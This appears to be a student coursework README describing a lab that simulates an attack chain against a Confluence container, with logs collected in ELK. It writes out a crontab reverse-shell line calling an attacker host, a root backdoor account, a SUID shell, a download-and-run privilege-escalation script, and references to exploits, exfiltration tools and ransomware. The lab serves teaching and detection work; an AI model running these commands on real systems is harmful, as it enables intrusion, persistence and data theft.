![icon](https://user-images.githubusercontent.com/27985157/197839626-a557ecb6-ba39-4927-b588-65aa90b8c50b.png)
# ICT3204 - Coursework Assignment 1
- To plan and implement a attack simulation utilizing `ATT&CK tactics`, `techniques`
- To integrate the usage of `Vagrant Scripts` and `Docker Containers`
- To perform log `collection`, `cleaning` and `visualisation` with the use of the `ELK` stack

## Members
- `2000941` - Ian Peh Shun Wei
- `2001174` - Kevin Pook Yuan Kai
- `2001209` - Lim Jin Tao Benjamin
- `2001267` - Foong Jun Hui
- `2001558` - Jeremy Jevon Chow Zi You
- `2001689` - Cham Zheng Han Donovan

## MITRE ATT&CK Techniques Chosen
- Initial Access - `Exploit Public-Facing Application`
- Privilege Escalation - `Exploit Buffer Overflow`
- Persistence - `Exploit SUID Binary File`
- Credential Access - `Unsecured Credentials`
- Collection & Exfiltration - `Exfiltration via ICMP and DNS`
- Impact - `Ransomware`

## Host Machine Dependencies
1. `Vagrant` - https://www.vagrantup.com/downloads
2. `Docker Engine` - https://www.docker.com/
3. If using WSL2
   - Create file `.wslconfig` in `C:\Users\user`
   - Edit and add the following line: 
```
[wsl2] 
kernelCommandLine = "sysctl.vm.max_map_count=262144"
```

## Architecture
View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0ba2-476d-b156-56c140aab2bd/edit?viewport_loc=-393%2C-96%2C2219%2C979%2C0_0&invitationId=inv_5979f7e6-9a73-4b7e-b835-07418f9dae9d#)

<img src="https://user-images.githubusercontent.com/1593214/197392810-d5950ac7-472b-47ed-a0f6-2cdf622235cc.png" width="1024">

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

# Usage 
### Table of Contents
  - [Part 1 - Spinning Up The Infrastructure](#part-1---spinning-up-the-infrastructure)
    - [WSL2](#wsl2)
    - [Quick Commands](#quick-commands)
  - [Part 2 - Logs, Dashboards and Services](#part-2---logs-dashboards-and-services)
    - [Confluence - Attack Target](#confluence---attack-target)
    - [Kibana (ELK) Dashboard](#kibana-elk-dashboard)
  - [Part 3 - Attack Vector and Exploits](#part-3---attack-vector-and-exploits)
    - [Automation](#automation)
    - [Initial Access](#initial-access)
      - [CVE-2022-26134 - Confluence RCE](#cve-2022-26134---confluence-rce)
    - [Privilege Escalation](#privilege-escalation)
      - [CVE-2021-3156 - Buffer Overflow Root Shell](#cve-2021-3156---buffer-overflow-root-shell)
      - [Abuse Elevation Control Mechanism](#abuse-elevation-control-mechanism)
    - [Persistence](#persistence)
      - [Persistence Using SUID Binaries](#persistence-using-suid-binaries)
      - [Persistence Using Account](#persistence-using-account)
	  - [Persistence Using Crontab](#persistence-using-crontab)
    - [Credential Access](#credential-access)
      - [DumpsterDiver](#dumpsterdiver)
      - [LaZagne](#lazagne)
      - [linPEAS](#linpeas)
    - [Exfiltration](#exfiltration)
      - [Exfiltrate Data Over ICMP](#exfiltrate-data-over-icmp)
      - [Exfiltrate Data Over DNS](#exfiltrate-data-over-dns)
    - [Impact](#impact)
      - [Ransomware Payload](#ransomware-payload)
  - [Documentation](#documentation)
    - [Kibana Dashboard](kibana-dashboard)
    - [Poster](poster)
    - [YouTube](YouTube)

## Part 1 - Spinning Up The Infrastructure
1. Ensure Docker Engine is **running**
2. From within project folder
    ```console
    HOST-MACHINE@HOST $ vagrant up
    ```
    > Expected output 
      ```console
      HOST-MACHINE@HOST $ vagrant up
      Bringing machine 'elk' up with 'docker' provider...
      Bringing machine 'kali' up with 'docker' provider...
      Bringing machine 'postgres' up with 'docker' provider...
      Bringing machine 'confluence' up with 'docker' provider...
      ...
      ...
      ```
      
      ```console
      HOST-MACHINE@HOST $ docker container ls
      CONTAINER ID   IMAGE                           COMMAND                    CREATED           STATUS          PORTS                                                                                                      NAMES
      ...            postgres:14                     "docker-entrypoint.s…"     .. minutes ago    Up xx minutes   0.0.0.0:5432->5432/tcp                                                                                     postgres
      ...            kevinpook/confluence-7.13.0     "/bin/sh -c '/usr/sb…"     .. minutes ago    Up xx minutes   127.0.0.1:2201->22/tcp, 0.0.0.0:80->8090/tcp                                                               confluence
      ...            sebp/elk                        "/usr/local/bin/star…"     .. minutes ago    Up xx minutes   0.0.0.0:5044->5044/tcp, 0.0.0.0:5601->5601/tcp, 0.0.0.0:9200->9200/tcp, 0.0.0.0:9600->9600/tcp, 9300/tcp   elk
      ...            tknerr/baseimage-ubuntu:18.04   "/bin/sh -c '/usr/sb…"     .. minutes ago    Up xx minutes   127.0.0.1:2222->22/tcp                                                                                     kali
      ```
    3. Configure imported ELK Dashboard

    ```console
    HOST-MACHINE@HOST $ vagrant docker-exec elk -- cp /vagrant/config/dashboard/project_board.ndjson /home

    HOST-MACHINE@HOST $ vagrant docker-exec elk -- curl -X POST "http://127.0.0.1:5601/api/saved_objects/_import?createNewCopies=true" -H "kbn-xsrf: true" --form file=@/home/project_board.ndjson
    ```

### WSL2
If running on WSL2, note that you need to configure your reinstall your WSL2 kernel to enable logging for the containers spun up by docker. This is because the standard WSL2 kernel comes with the options for `CONFIG_AUDIT` and `CONFIG_NETFILTER_XT_TARGET_AUDIT` disabled. The reason is roughly due to the lack of support for SElinux on WSL2, which made this an unnecessary feature. To ensure that logging functionalities on the **Confluence** machine through the `auditd` package can work, the kernel must be rebuilt with the asforementioned options enabled.  

The reference guide is [here](https://blog.jp.square-enix.com/iteng-blog/posts/00004-auditd-on-wsl2-windows10/). The compiled kernel is located in the project root: `bzImage`. Just add the `bzImage` path to the `.wslconfig` located in the user home directory (`C:\Users\User\.wslconfig`) => `kernel=<path to bzImage>`. Restart WSL2 after that and run `vagrant up` to check if the configuration is successful. Note that this configuration is only tested on WSL2 `Ubuntu-20.04` image.

1. Create the file `C:\Users\User\.wslconfig`
2. Add this code (NOTE: make sure to use `\\` to escape the `\`):

```
[wsl2]
kernel=C:\\Users\\myuser\\...\\3204_coursework_1\\bzImage
```

3. Ensure that docker is **NOT** running
4. Open command prompt and run `wsl --shutdown`
5. The next time you open WSL2 you should be able to see the output as follows

```console
$ uname -a
Linux MYMACHINE 5.15.68.1-microsoft-standard-WSL2-3204+ #1 SMP Tue Oct 25 10:13:28 +08 2022 x86_64 x86_64 x86_64 GNU/Linux

$ zfgrep AUDIT /proc/config.gz
CONFIG_AUDIT=y
CONFIG_HAVE_ARCH_AUDITSYSCALL=y
CONFIG_AUDITSYSCALL=y
CONFIG_AUDIT_ARCH=y
# CONFIG_KVM_MMU_AUDIT is not set
CONFIG_NETFILTER_XT_TARGET_AUDIT=y
```

### Quick Commands
```console
# Get the status of the current vagrant machines
HOST-MACHINE@HOST $ vagrant status

# Delete and stop
HOST-MACHINE@HOST $ vagrant destroy

# Stop only
HOST-MACHINE@HOST $ vagrant halt
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

## Part 2 - Logs, Dashboards and Services

### Confluence - Attack Target
- Simulated Network - `10.0.0.3`
- Testing and User Access - [`http://127.0.0.1:80`](http://127.0.0.1:80)

### Kibana (ELK) Dashboard
- Simulated Network - `10.0.0.2`
- User Access - [`http://127.0.0.1:5601`](http://127.0.0.1:5601)
- Browse to [`http://127.0.0.1:5601/app/dashboards`](http://127.0.0.1:5601/app/dashboards) to view the log dashboards. (e.g [Packetbeat] Overview ECS)
- Exported diagrams can be imported by placing them in `config/dashboard` and renaming them to `project_board.ndjson`

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

## Part 3 - Attack Vector and Exploits
The simulated attacker that is used to perform the relevant [MITRE ATT&CK](https://attack.mitre.org) techniques can be accessed by utilizing the **Attacker/Kali Docker container**
```console
HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
```

### Automation
The process of the attacks can be automated by adding the commands to be executed in the host machine into a bash script. The script is passed into the Vagrantfile with the `run: "never"` parameter, which ensures that it does not run during the normal setup process. To manually activate the individual phases of the attack, run the following command: 

```console
HOST-MACHINE@HOST $ vagrant provision --provision-with <configured attack> 
```
Available configured attacks: `initialaccess` `privesc` `persistence` `credentialaccess` `exfil` `ransom`

### Initial Access
#### CVE-2022-26134 - Confluence RCE
- https://github.com/jbaines-r7/through_the_wire

    <img src="https://user-images.githubusercontent.com/1593214/197329877-ef4c952d-2de8-49e2-84ab-fde8a30edea3.png" width="512">

##### Proof-of-Concept 
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with initialaccess
==> kali: Running provisioner: initialaccess (shell)...
	...
    kali: confluence@confluence:/opt/atlassian/confluence/bin$ exit
HOST-MACHINE@HOST $
```
##### Reverse Shell Access
```console
HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
root@kali # cd /tmp/1_InitialAccess
root@kali # bash runme.sh
confluence@confluence:/opt/atlassian/confluence/bin $
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Privilege Escalation
#### CVE-2021-3156 - Buffer Overflow Root Shell
https://github.com/CptGibbon/CVE-2021-3156

- Heap-Based Buffer Overflow in Sudo also known as [Baron Samedit](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
- Vulnerability exploitation allows low privileged users to gain root privileges
- Privilege escalation via "sudoedit -s" and a command-line argument that ends with a single backslash character

##### Running CVE-2021-3156 Exploit
```console
root@confluence:/# su confluence
confluence@confluence:/$ cd /vagrant/attack/2_PrivilegeEscalation
confluence@confluence:/vagrant/attack/2_PrivilegeEscalation$ ./Gp08_demo_1_cve.sh
root@confluence:/tmp/pe/CVE-2021-3156#
```

#### Abuse Elevation Control Mechanism
The python package installer (PIP) can be used by the confluence user to gain sudo access by running an exploit script that abuses over-privilege.

##### Running PIP Exploit
```console
root@confluence:/# su confluence
confluence@confluence:/$ cd /tmp/pe
confluence@confluence:/tmp/pe$ wget https://gist.githubusercontent.com/kevinnivekkevin/a9c929a632de3ff4c3b03fbbd247c6f2/raw/e740c5d73ff0a8b17ba3b54c2bfebfe102f3f197/sudoers_pe.sh
confluence@confluence:/tmp/pe$ chmod +x sudoers_pe.sh
confluence@confluence:/tmp/pe$ ./sudoers_pe.sh
root@confluence:/#
```

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with privesc 
```
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with sudoerspe
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Persistence
#### Persistence Using SUID Binaries
- After gaining root access via privilege escalation, create suid binary to allow anyone to execute the file.
- Allows attacker to regain root privileges from low privileged user account.
    
##### Setup
```console
root@confluence:/# cd /tmp
root@confluence:/tmp# cp /vagrant/attack/persistence/Gp08_binarysuid /tmp/suid.c
```
```console
root@confluence:/tmp# gcc suid.c -o suid
root@confluence:/tmp# chmod 7111 suid
root@confluence:/tmp# rm suid.c
```
##### Regain
```console
confluence@confluence:/tmp$ ./suid
whoami
root
```

#### Persistence Using Account
- After gaining root access via privilege escalation, create root privileges account.
- Allows attacker to regain root privileges by accessing the account.

```console
root@confluence:/tmp# useradd -ou 0 -g 0 systemd
root@confluence:/tmp# chpasswd <<<"systemd:systemd"
```
##### Regain
```console
confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
confluence@confluence:/tmp$ python /tmp/shell.py
bash: /root/.bashrc: Permission denied
confluence@confluence:/tmp$ su systemd
Password: systemd
# whoami
whoami
root
```

#### Persistence Using Crontab
- After gaining root access via privilege escalation, create crontab to run /bin/bash every 1 min on port 4242.
- Allows attacker to regain root privileges by listening to port 4242.

```console
root@confluence:/tmp# (crontab -l ; echo "* * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
```
##### Regain
```console
root@kali:/# nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.3] 35094
bash: cannot set terminal process group (23962): Inappropriate ioctl for device
bash: no job control in this shell
root@confluence:~# whoami
root
```

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Credential Access
#### DumpsterDiver
[DumpsterDiver](https://github.com/securing/DumpsterDiver) is a tool that is used to detect any hardcoded secrets like keys or passwords.

#### LaZagne
[LaZagne](https://github.com/AlessandroZ/LaZagne) is an application that is used to retrieve passwords stored on a local computer.

#### linPEAS
[linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is a script that searches for possible paths to escalate privileges on Linux. Its functionalities include searching for possible passwords inside all the accessible files of the system.

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with credentialaccess 
```

- Output from the tools used are stored at `/tmp/exfiltrate/credentialAccess`

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Exfiltration
#### Exfiltrate Data Over ICMP
https://github.com/ariary/QueenSono
#### Exfiltrate Data Over DNS
https://github.com/m57/dnsteal

- Collected files are tar-ed from the Confluence server sent to the attacker server via ICMP and DNS
- All files that are to be exfiltrated can be placed at `/tmp/exfiltrate` on the Confluence server
- Files received by the attacker can be found at `/tmp/qs/` (ICMP) and `/tmp/dnsteal/` (DNS)
- Data is exfiltrated to the attacker at X minute intervals (currently set to 1).

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with exfil 
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Impact
#### Ransomware Payload
[Python Ransomware Sample](https://infosecwriteups.com/how-to-make-a-ransomware-with-python-c4764f2014cf)

- Run `Gp08_keygen.py` to generate the `2048-bit` RSA public and private keys used for the encryption process.
- How the ransomware program works:
  - Encryption done in `PKCS#1 OAEP` (`RSAES-OAEP`): Asymmetric cipher based on RSA and OAEP padding.
  - Folders passed in as input to the `cryptic` (ransomware executable) 
  - Folders will be recursively traversed to find files to encrypt.
  - All files found will be encrypted with the public key.
  - All encrypted files will have a new extension `.r4ns0m3`.
- After the ransomware has completed running, the original home page for the **Confluence** will be replaced with a defaced home page located at `attack/impact/Gp08_login.vm`

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with ransom 
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

## Documentation
### Kibana Dashboard
![dashboard](https://user-images.githubusercontent.com/27985157/197850136-80221656-b748-406f-856e-8489cd683966.png)

### Poster
### YouTube
